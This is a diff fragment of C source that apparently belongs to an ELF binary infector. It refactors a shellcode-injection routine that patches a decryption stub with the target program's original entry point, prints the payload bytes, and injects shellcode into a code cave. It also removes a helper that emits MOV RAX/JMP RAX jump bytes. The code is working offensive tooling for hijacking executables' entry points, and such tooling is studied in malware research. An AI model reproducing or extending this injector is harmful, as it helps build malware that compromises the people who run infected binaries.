@@ -268,47 +268,43 @@ fd_set_to_ph_offset(int fd, const Elf64_Ehdr header, Elf64_Phdr program_header) 
     }
     return 1;
 }
-void
-make_jump_code(uint8_t *buffer, void *target) {
-    buffer[0] = 0x48; // REX.W prefix for 64-bit operand
-    buffer[1] = 0xB8; // MOV RAX, imm64
-    // Copy the 8-byte address into the next bytes
-    memcpy(&buffer[2], &target, 8);
-    buffer[10] = 0xFF; // JMP RAX
-    buffer[11] = 0xE0;
-}
 
 void
-print_payload() {
+print_payload(uint8_t *payload, size_t payload_size) {
     int i;
-    for (i = 0; i < sizeof(decryption_stub) / 8; ++i) {
+    for (i = 0; i < payload_size / 8; ++i) {
         for (int j = 0; j < 8; ++j) {
-            printf("0x%02x, ", decryption_stub[i * 8 + j]);
+            printf("0x%02x, ", payload[i * 8 + j]);
         }
         printf("\n");
     }
-    size_t remainder = sizeof(decryption_stub) % 8;
+    size_t remainder = payload_size % 8;
     for (int j = 0; j < remainder; ++j) {
-        printf("0x%02x, ", decryption_stub[i * 8 + j]);
+        printf("0x%02x, ", payload[i * 8 + j]);
     }
     printf("\n");
+}
+
+void
+overwrite_entrypoint(uint8_t *payload, size_t payload_size, Elf64_Addr entrypoint, uint64_t marker) {
+    for (int i = 0; i < payload_size - 8; ++i) {
+        uint64_t *ptr = (uint64_t *)&payload[i];
+        if (*ptr == marker) {
+            *ptr = entrypoint;
+            printf("Replaced stub marker with actual entrypoint\n");
+            break;
+        }
+    }
 }
 
 int
 shellcode_inject(Elf64_Ehdr header, Elf64_Phdr program_header, const code_cave_t code_cave, uint8_t shellcode[], const uint64_t shellcode_size, int fd,
                  size_t text_size) {
 
-    for (int i = 0; i < sizeof(decryption_stub) - 8; ++i) {
-        uint64_t *ptr = (uint64_t *)&decryption_stub[i];
-        if (*ptr == 0x4242424242424242) {
-            *ptr = header.e_entry;
-            printf("Replaced stub marker with actual entrypoint\n");
-            break;
-        }
-    }
+    overwrite_entrypoint(decryption_stub, sizeof(decryption_stub), header.e_entry, 0x4242424242424242);
 
     printf("Injecting payload:\n");
-    print_payload();
+    print_payload(decryption_stub, sizeof(decryption_stub));
     printf("Old entrypoint: %lx\n", header.e_entry);
 
     // copy shellcode
